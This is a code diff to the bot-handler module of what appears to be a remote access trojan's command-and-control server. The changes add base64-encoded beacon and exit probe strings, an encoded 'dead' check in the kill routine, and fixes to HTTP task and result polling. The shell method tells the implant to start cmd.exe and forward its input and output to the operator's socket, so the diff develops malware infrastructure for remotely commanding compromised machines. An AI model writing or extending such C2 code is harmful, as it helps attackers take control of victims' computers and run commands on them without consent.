@@ -10,6 +10,9 @@ import time
 import random
 import base64
 
+import json
+import requests
+
 class Handler(threading.Thread):
 
     def __init__(self, agent_id, loggers, transport_type, client=None, client_address=None):
@@ -37,13 +40,26 @@ class Handler(threading.Thread):
         self.status = ["UP","UP"]                       # <--UP - DOWN - ERR 
                                                         # [0] = PING, [1] = BEACON
 
+        # strings used for important communication
+        self.beacon_probe = "d2hhdCBhIGdyZWF0IGRheSB0byBzbWVsbCBmZWFy"
+        self.beacon_reply = "reply code"
+        self.os_win_probe = "UHJvYmluZyBPcGVyYXRpbmcgU3lzdGVt"
+        self.os_win_reply = ""
+        self.os_nix_probe = ""
+        self.os_nix_reply = ""
+        self.kill_probe = ""
+        self.kill_reply = ""
+        self.exit_probe = "c2xlZXBpbmc"
+        self.exit_reply = "c2xlZXBpbmc"
+
+
     # HTTP helper functions
-    def api_get_request(endpoint):
+    def api_get_request(self, endpoint):
         response_raw = requests.get(self.address + endpoint).text
         response_json = json.loads(response_raw)
         return response_json
 
-    def api_post_request(endpoint, payload):
+    def api_post_request(self, endpoint, payload):
         response_raw = requests.post(self.address + endpoint, json=payload).text
         response_json = json.loads(response_raw)
         return response_json
@@ -68,7 +84,13 @@ class Handler(threading.Thread):
 
         # Beacon indefinitely??
         self.beacon()
-                                
+
+
+#------------------------------------------------------------------------------------------------------------------------------
+#          | GETTERS AND SETTERS |
+#------------------------------------------------------------------------------------------------------------------------------
+
+        
     def setStatus(self, index0, index1):
         self.status[0] = index0
         self.status[1] = index1
@@ -103,16 +125,24 @@ class Handler(threading.Thread):
 #------------------------------------------------------------------------------------------------------------------------------
 
     def kill(self):     # hah
+        return_code = ''
         print(f"\n[*BotHandler-Msg] Severing connection for agent {str(self.agent_id)}...")
 
         # Log
         self.loggers[0].q_log('serv','info','[* BotHandler-Msg] Killing connection for agent '+str(self.agent_id))
         self.loggers[0].q_log('conn','info','[* BotHandler-Msg] Killing connection for agent '+str(self.agent_id))
 
-        self.execute("kill")
+        return_val = self.execute("kill")
+
+        if "ZGVhZA" in return_val:
+            return_code = True
+        else:
+            return_code = False
 
         self.loggers[0].q_log('serv','info','[* BotHandler-Msg] Sent "kill" command to agent '+str(self.agent_id))
-        self.loggers[0].q_log('conn','info','[* BotHandler-Msg] Sent "kill" command to agent '+str(self.agent_id))        
+        self.loggers[0].q_log('conn','info','[* BotHandler-Msg] Sent "kill" command to agent '+str(self.agent_id))     
+
+        return return_code   
 
 #------------------------------------------------------------------------------------------------------------------------------
 
@@ -160,16 +190,16 @@ class Handler(threading.Thread):
                         self.loggers[0].q_log('up','info','[* BotHandler-Msg] Agent '+str(self.agent_id)+' - BEACON : ERROR')
 
                 elif(self.transport_type == "HTTP"):
-                    request_payload_string = f'[{{"task_type":"ping","agent_id":{self.bot_id}}}]'
+                    request_payload_string = f'[{{"task_type":"ping","agent_id":{self.agent_id}}}]'
                     request_payload = json.loads(request_payload_string)
-                    task_obj = api_post_request("/tasks", request_payload)
+                    task_obj = self.api_post_request("/tasks", request_payload)
                     task_id = task_obj["task_id"]
                     wfc = True # waiting for connection
                     t_end = time.time() + 10
                     while(time.time() < t_end and wfc):
-                        results = api_get_request("/results")
+                        results = self.api_get_request("/results")
                         for i in range(len(results)):
-                            if(results[i]["agent_id"] == self.bot_id and results[i]["task_id"] == task_id and results[i]["success"] == "true"):
+                            if(results[i]["agent_id"] == self.agent_id and results[i]["task_id"] == task_id and results[i]["success"] == "true"):
                                 wfc = False
                                 self.status[0] = "UP"
                             else:
@@ -179,10 +209,7 @@ class Handler(threading.Thread):
 
     def shell(self):
 
-        self.beacon_wait = True
-
         # Initiate shell
-
         try:
             self.execute("shell", True)             # Signals RAT to initiate cmd.exe process and forward fds to socket
         except Exception as ex:
@@ -192,7 +219,6 @@ class Handler(threading.Thread):
             print(f"[* BotHandler-Msg:ShellExec] Error: {ex}")
             self.loggers[0].q_log('conn','info','[* BotHandler-Msg:ShellExec] Error: '+str(ex))
 
-            self.beacon_wait = False
             return False                            # unsuccessful
         else:
 
@@ -231,8 +257,8 @@ class Handler(threading.Thread):
 
                     if(cmd_sent.casefold().strip(" ") == 'quit\n' or cmd_sent.casefold().strip(" ") == 'exit\n'):
                         print(f"[* BotHandler-Msg:ShellExec] Sending EXIT signal to Agent. Please wait...")
-                        self.loggers[0].q_log('serv','info','[* BotHandler-Msg:ShellExec] Sending EXIT signal to agent: '+str(agent_id))
-                        self.loggers[0].q_log('conn','info','[* BotHandler-Msg:ShellExec] Sending EXIT signal to agent: '+str(agent_id))
+                        self.loggers[0].q_log('serv','info','[* BotHandler-Msg:ShellExec] Sending EXIT signal to agent: '+str(self.agent_id))
+                        self.loggers[0].q_log('conn','info','[* BotHandler-Msg:ShellExec] Sending EXIT signal to agent: '+str(self.agent_id))
 
                         self.client.send(("exit\n").encode('utf-8'))
 
@@ -313,7 +339,6 @@ class Handler(threading.Thread):
         self.loggers[0].q_log('serv','info','[* BotHandler-Msg:ShellExec] Exiting Shell interaction with agent '+str(self.agent_id)+' at '+str(self.ip))
         self.loggers[0].q_log('conn','info','[* BotHandler-Msg:ShellExec] Exiting Shell interaction with agent '+str(self.agent_id)+' at '+str(self.ip))
 
-        self.beacon_wait = False
         return True
 #------------------------------------------------------------------------------------------------------------------------------
     def execute(self, cmd_sent, suppress=True):
